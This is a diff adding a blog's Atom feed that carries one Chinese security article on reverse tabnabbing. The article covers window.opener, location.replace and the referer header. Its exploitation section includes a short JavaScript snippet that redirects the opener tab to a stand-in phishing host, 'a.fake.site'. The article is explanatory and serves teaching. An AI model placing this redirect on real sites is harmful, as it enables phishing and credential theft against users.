@@ -1,0 +1,63 @@
+<?xml version="1.0"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+    <id>https://StarofEden.github.io</id>
+    <title>StarofEden🌸 • Posts by &#34;html&#34; tag</title>
+    <link href="https://StarofEden.github.io" />
+    <updated>2023-11-08T16:00:00.000Z</updated>
+    <category term="mysql" />
+    <category term="JavaScript" />
+    <category term="nodejs" />
+    <category term="xctf" />
+    <category term="网络安全" />
+    <category term="html" />
+    <entry>
+        <id>https://starofeden.github.io/2023/11/09/%E9%92%93%E9%B1%BC%E6%94%BB%E5%87%BB/</id>
+        <title>危险的 target=&#34;_blank&#34; 与 “opener”</title>
+        <link rel="alternate" href="https://starofeden.github.io/2023/11/09/%E9%92%93%E9%B1%BC%E6%94%BB%E5%87%BB/"/>
+        <content type="html">&lt;blockquote&gt;
+&lt;p&gt;作者：jinliming2@知道创宇 404 实验室&lt;br&gt;
+原文：&lt;a href=&#34;http://mp.weixin.qq.com/s/T4jQUdS-rar7hr2EWilJrw&#34;&gt;http://mp.weixin.qq.com/s/T4jQUdS-rar7hr2EWilJrw&lt;/a&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h1 id=&#34;前置知识&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#前置知识&#34;&gt;#&lt;/a&gt; 前置知识&lt;/h1&gt;
+&lt;h2 id=&#34;parent-与-opener&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#parent-与-opener&#34;&gt;#&lt;/a&gt; parent 与 opener&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;window.parent:&lt;br&gt;
+ 我们可以通过 window.parent 从当前窗口打开父窗口。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;figure class=&#34;highlight js&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable language_&#34;&gt;window&lt;/span&gt;.&lt;span class=&#34;title function_&#34;&gt;open&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;#x27;width=200,height=100&amp;#x27;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;blockquote&gt;
+&lt;p&gt;在  &lt;code&gt;&amp;lt;iframe&amp;gt;&lt;/code&gt;  中提供了一个用于父子页面交互的对象，叫做 window.parent，我们可以通过 window.parent 对象来从框架中的页面访问父级页面的 window。&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;ul&gt;
+&lt;li&gt;window.opener&lt;/li&gt;
+&lt;/ul&gt;
+&lt;blockquote&gt;
+&lt;p&gt;opener 与 parent 一样，只不过是用于  &lt;code&gt;&amp;lt;a target=&amp;quot;_blank&amp;quot;&amp;gt;&lt;/code&gt;  在新标签页打开的页面的。通过 &lt;code&gt;&amp;lt;a target=&amp;quot;_blank&amp;quot;&amp;gt;&lt;/code&gt;  打开的页面，可以直接使用 window.opener 来访问来源页面的 window 对象。&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h2 id=&#34;同域与跨域&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#同域与跨域&#34;&gt;#&lt;/a&gt; 同域与跨域&lt;/h2&gt;
+&lt;p&gt;浏览器提供了完整的跨域保护，在域名相同时， parent 对象和 opener 对象实际上就直接是上一级的 window 对象；而当域名不同时， parent 和 opener 则是经过包装的一个 global 对象。这个 global 对象仅提供非常有限的属性访问，并且在这仅有的几个属性中，大部分也都是不允许访问的（访问会直接抛出 DOMException）。&lt;/p&gt;
+&lt;p&gt;在 &lt;code&gt; &amp;lt;iframe&amp;gt;&lt;/code&gt;  中，提供了一个 sandbox 属性用于控制框架中的页面的权限，因此即使是同域，也可以控制 &lt;code&gt; &amp;lt;iframe&amp;gt;&lt;/code&gt;  的安全性。&lt;/p&gt;
+&lt;h2 id=&#34;locationreplace&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#locationreplace&#34;&gt;#&lt;/a&gt; location.replace&lt;/h2&gt;
+&lt;p&gt;replace () 方法可用一个新文档取代当前文档。&lt;/p&gt;
+&lt;figure class=&#34;highlight javascript&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable language_&#34;&gt;window&lt;/span&gt;.&lt;span class=&#34;property&#34;&gt;location&lt;/span&gt;.&lt;span class=&#34;title function_&#34;&gt;replace&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;https://www.runoob.com&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;h2 id=&#34;http-referer&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#http-referer&#34;&gt;#&lt;/a&gt; HTTP Referer&lt;/h2&gt;
+&lt;p&gt;可以通过 http 的 referer 字段判断你是从那个网站过来的（替换原来网站的前置条件）&lt;/p&gt;
+&lt;h1 id=&#34;利用&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#利用&#34;&gt;#&lt;/a&gt; 利用&lt;/h1&gt;
+&lt;h2 id=&#34;详细步骤&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#详细步骤&#34;&gt;#&lt;/a&gt; 详细步骤&lt;/h2&gt;
+&lt;p&gt;1. 在你的网站  &lt;code&gt;https://example.com&lt;/code&gt;  上存在一个链接：&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;a href=&amp;quot;https://an.evil.site&amp;quot;target=&amp;quot;_blank&amp;quot;&amp;gt;进入一个“邪恶”`的网站&amp;lt;/a&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;2. 用户点击了这个链接，在新的标签页打开了这个网站。这个网站可以通过  &lt;code&gt;HTTP Header&lt;/code&gt;  中的  &lt;code&gt;Referer&lt;/code&gt;  属性来判断用户的来源。&lt;/p&gt;
+&lt;p&gt;并且，这个网站上包含着类似于这样的 JavaScript 代码：&lt;/p&gt;
+&lt;figure class=&#34;highlight javascript&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;const&lt;/span&gt; url=&lt;span class=&#34;built_in&#34;&gt;encodeURIComponent&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;#123;&amp;#123;header.referer&amp;#125;&amp;#125;&amp;#x27;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable language_&#34;&gt;window&lt;/span&gt;.&lt;span class=&#34;property&#34;&gt;opener&lt;/span&gt;.&lt;span class=&#34;property&#34;&gt;location&lt;/span&gt;.&lt;span class=&#34;title function_&#34;&gt;replace&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;https://a.fake.site/?&amp;#x27;&lt;/span&gt;+url);&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;3. 此时，用户在继续浏览这个新的标签页，而原来的网站所在的标签页此时已经被导航到了 &lt;code&gt; https://a.fake.site/?https%3A%2F%2Fexample.com%2F。&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;4. 恶意网站 &lt;code&gt;https://a.fake.site&lt;/code&gt;  根据  &lt;code&gt;Query String &lt;/code&gt; 来伪造一个足以欺骗用户的页面，并展示出来（期间还可以做一次跳转，使得浏览器的地址栏更具有迷惑性）。&lt;/p&gt;
+&lt;p&gt;5. 用户关闭 &lt;code&gt; https://an.evil.site&lt;/code&gt;  的标签页，回到原来的网站……………… 已经回不去了。&lt;/p&gt;
+&lt;p&gt;上面的攻击步骤是在跨域的情况下的，在 &lt;code&gt;跨域情况&lt;/code&gt; 下， opener 对象和 parent 一样，是受到限制的，仅提供非常有限的属性访问，并且在这仅有的几个属性中，大部分也都是不允许访问的（访问会直接抛出 DOMException）。&lt;/p&gt;
+&lt;p&gt;但是与 parent 不同的是， &lt;code&gt;在跨域的情况下， opener 仍然可以调用 location.replace 方法&lt;/code&gt; 而 parent 则不可以。&lt;/p&gt;
+&lt;p&gt;如果是在同域的情况下（比如一个网站上的某一个页面被植入了恶意代码），则情况要比上面严重得多。&lt;/p&gt;
+</content>
+        <category term="网络安全" />
+        <category term="html" />
+        <updated>2023-11-08T16:00:00.000Z</updated>
+    </entry>
+</feed>
